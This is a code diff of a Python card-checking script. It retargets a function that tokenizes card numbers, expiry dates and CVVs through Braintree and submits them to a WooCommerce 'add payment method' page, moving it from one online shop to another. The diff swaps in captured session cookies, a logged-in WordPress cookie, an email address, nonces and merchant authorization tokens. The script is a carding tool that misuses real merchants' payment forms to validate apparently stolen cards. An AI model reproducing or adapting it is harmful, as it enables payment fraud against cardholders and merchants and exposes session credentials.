@@ -90,7 +90,7 @@ def chk(card):
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQyNTQ3NzksImp0aSI6ImUzMWY5ZDZhLTQ3NmYtNGJiNi04NDM5LTZkMmY0YjUwOTlkNSIsInN1YiI6InF5anJxNDR6Y2Q2czMyOWoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF5anJxNDR6Y2Q2czMyOWoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.3Nv4BoqabdgC1_Xr_9xXItri7AMbYWna_lY2k528jGSWcjET0vIfv8X6aRuACza7zNXftzV9elAYuEkocauAow',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ0ODAwNTQsImp0aSI6IjFiODFhZDVmLTczMTktNDMwMC04ZjJiLTI3MDUwYWRmY2NkZCIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6QVhPIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InN0dWR5bm90ZXNhYmFsbGNfaW5zdGFudCJ9fQ.aL572UBrNeVCx0dOxcOoEg7dlDsyPDdAsWPT1sGnVw_7LLU8XqkVW_U6HVFNWa-Aci2SnFmnzFKKdBPYRoNwCQ',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -110,16 +110,20 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '70e2bc4c-7851-401e-bcbf-9096dc51859c',
+        'sessionId': 'aa3c4b5f-b945-4f1f-ba1c-57c1ad6e0592',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
         'input': {
             'creditCard': {
-                'number': n,
+                'number':n,
                 'expirationMonth': mm,
                 'expirationYear': yy,
                 'cvv': cvc,
+                'billingAddress': {
+                    'postalCode': '10080',
+                    'streetAddress': 'hhfhfbfv',
+                },
             },
             'options': {
                 'validate': False,
@@ -137,30 +141,37 @@ def chk(card):
 
 
 	cookies = {
-    '_ga': 'GA1.1.1015169626.1733746575',
-    'cookie_notice_accepted': 'true',
-    'wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4': 'bbxbcbb.hhxbfbb%7C1734351495%7C4eKKrgpXurvB3YAsTjz6eBpKMnTEycu68V602RJRElm%7C194468616d4f271eeab6e4420656fc36d289f761a41e90d7b523b6e242357969',
-    'wfwaf-authcookie-8c84895040128b898589b5670ddc8148': '157%7Cother%7Cread%7Cc9a16befcc0f9437d751bbc6dbdced35760d3cd471282731d449e7a565e3283f',
+    '_ga': 'GA1.1.998389256.1720402750',
+    '_fbp': 'fb.1.1720402754229.108781710779578398',
+    'cookielawinfo-checkbox-necessary': 'yes',
+    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
+    'viewed_cookie_policy': 'yes',
+    'mtk_src_trk': '{"type":"typein","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_pages":"2","session_count":"24"}',
+    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
+    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': 'bfidjmoh5527vbnm%7C1734946762%7Cq57xPnP5LimFHbVxfM86P5kE7e59YIpaUVAOVA5UIT6%7C2547c543699b5df3b61bd76b52ff7e15ce35a19984f9cfd3dc889acca81f0eaa',
+    'mailchimp_user_previous_email': 'moh5527vbnm%40gmail.com',
+    'mailchimp_user_email': 'moh5527vbnm%40gmail.com',
+    '_ga_SGEGXEGQDY': 'GS1.1.1734393656.52.0.1734393656.60.0.0',
+    '_ga_WNQMQBX793': 'GS1.1.1734393672.49.0.1734393672.60.0.0',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-12-14%2009%3A26%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
-    'sbjs_first_add': 'fd%3D2024-12-14%2009%3A26%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_current_add': 'fd%3D2024-12-17%2000%3A01%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-12-17%2000%3A01%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga_50RCK7EFBE': 'GS1.1.1734168376.7.0.1734168376.0.0.0',
+    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
 }
 
 	headers = {
-    'authority': 'identityfashion.online',
+    'authority': 'www.studynotesaba.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_ga=GA1.1.1015169626.1733746575; cookie_notice_accepted=true; wordpress_logged_in_01ab3e4e3f8942e1c1b51e73f4fe9bf4=bbxbcbb.hhxbfbb%7C1734351495%7C4eKKrgpXurvB3YAsTjz6eBpKMnTEycu68V602RJRElm%7C194468616d4f271eeab6e4420656fc36d289f761a41e90d7b523b6e242357969; wfwaf-authcookie-8c84895040128b898589b5670ddc8148=157%7Cother%7Cread%7Cc9a16befcc0f9437d751bbc6dbdced35760d3cd471282731d449e7a565e3283f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-14%2009%3A26%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-12-14%2009%3A26%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fidentityfashion.online%2Fmy-account%2Fadd-payment-method%2F; _ga_50RCK7EFBE=GS1.1.1734168376.7.0.1734168376.0.0.0',
-    'origin': 'https://identityfashion.online',
+    # 'cookie': '_ga=GA1.1.998389256.1720402750; _fbp=fb.1.1720402754229.108781710779578398; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; mtk_src_trk={"type":"typein","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_pages":"2","session_count":"24"}; mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=bfidjmoh5527vbnm%7C1734946762%7Cq57xPnP5LimFHbVxfM86P5kE7e59YIpaUVAOVA5UIT6%7C2547c543699b5df3b61bd76b52ff7e15ce35a19984f9cfd3dc889acca81f0eaa; mailchimp_user_previous_email=moh5527vbnm%40gmail.com; mailchimp_user_email=moh5527vbnm%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1734393656.52.0.1734393656.60.0.0; _ga_WNQMQBX793=GS1.1.1734393672.49.0.1734393672.60.0.0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-17%2000%3A01%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-17%2000%3A01%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
+    'origin': 'https://www.studynotesaba.com',
     'pragma': 'no-cache',
-    'referer': 'https://identityfashion.online/my-account/add-payment-method/',
+    'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -173,28 +184,25 @@ def chk(card):
 }
 
 	data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'master-card',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '{"correlation_id":"aac8db46073a802f397c4481c34bcd95"}',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': 'f33c3c88ac',
+    'payment_method': 'braintree_cc',
+    'braintree_cc_nonce_key': tok,
+    'braintree_cc_device_data': '{"device_session_id":"b21595334ab1d57737626f283388b9be","fraud_merchant_id":null,"correlation_id":"aa3c4b5f-b945-4f1f-ba1c-57c1ad6e"}',
+    'braintree_cc_3ds_nonce_key': '',
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQ0ODAwNzUsImp0aSI6IjA3ZDY1NDJjLTI5N2MtNDM0NS04ZjExLTUxOTllMDkzM2I4YyIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.GpLcoYAGei1YSochKn8Yg2eMUS-9fn9fC11ORz3loteeIioBRRxFhuJJR9NWcWYcl96qToTQQDK5MoMxf9b6Tw","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+    'woocommerce-add-payment-method-nonce': 'd2a544eb5a',
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
 
 	response = requests.post(
-    'https://identityfashion.online/my-account/add-payment-method/',
+    'https://www.studynotesaba.com/my-account/add-payment-method/',
     cookies=cookies,
     headers=headers,
     data=data,
 )
 
 	text = response.text
-	pattern = r'Status code (.*?)\s*</li>'
+	pattern = r'Status code \d+: (.*?)\s*</li>'
 
 	
 	
